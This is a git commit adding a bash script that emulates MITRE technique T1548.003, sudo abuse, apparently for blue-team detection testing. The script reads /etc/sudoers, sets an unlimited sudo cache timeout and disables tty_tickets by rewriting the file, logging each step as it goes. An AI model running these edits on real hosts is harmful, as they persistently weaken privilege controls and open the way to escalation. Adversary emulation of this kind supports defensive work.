4d4ef336a61d8a2d9a30e3691d4931bd927a8ae6
blueteamdefendersco <145217566+blueteamdefendersco@users.noreply.github.com>
2023-09-27 02:07:21 -0500

    Create T1548.003.sh

---
+++ atomic_scripts/linux/defense_evasion/T1548.003.sh
@@ -0,0 +1,34 @@
+#! /bin/bash
+
+# T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+
+function a() {
+    # Atomic Test 1 - Sudo usage
+    sleep 30
+    sudo -l      
+    sudo cat /etc/sudoers
+    sudo vim /etc/sudoers
+    echo  $(date -u) "Completed T1548.003 - Sudo usage" >> /tmp/attacktest.txt 
+    sleep 30
+}
+
+function b() {
+    # Atomic Test 2 - Unlimited sudo cache timeout
+    sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
+    sudo visudo -c -f /etc/sudoers
+    echo  $(date -u) "Completed T1548.003 - Unlimited sudo cache timeout" >> /tmp/attacktest.txt 
+    sleep 30
+}
+
+function c() {
+    # Atomic Test 3 - Disable tty_tickets for sudo caching
+    sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
+    sudo visudo -c -f /etc/sudoers
+    echo  $(date -u) "Completed T1548.003 - Disable tty_tickets for sudo caching" >> /tmp/attacktest.txt 
+    sleep 30
+}
+
+a
+b
+c
+
